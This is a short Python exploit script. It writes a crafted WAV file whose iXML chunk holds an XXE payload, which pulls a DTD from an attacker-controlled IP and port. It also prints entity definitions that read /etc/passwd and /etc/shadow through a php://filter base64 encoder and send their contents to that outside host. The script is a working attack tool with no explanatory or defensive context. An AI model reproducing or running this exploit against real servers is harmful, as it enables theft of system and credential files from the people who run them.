#!/usr/bin/python
import sys

remote_files_to_fetch = [
    "/etc/passwd",
    "/etc/shadow",
]


if len(sys.argv) == 4:
    ip_address = sys.argv[1]
    port = sys.argv[2]
    output_file = sys.argv[3]

    
    media_payload = f"RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{ip_address}:{port}/evil_code.dtd'>%remote;%init;%trick;]>\x00"    
    with open(output_file, 'w', encoding="latin-1") as media_payload_file:
        media_payload_file.write(media_payload)

    for remote_file in remote_files_to_fetch:
        payload1 = f"""
        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={remote_file}">
        <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{ip_address}:{port}/?p=%file;'>" >"""
        print(payload1)

else:
    print(f"Usage: ./{sys.argv[0]} ip_address port output_file")
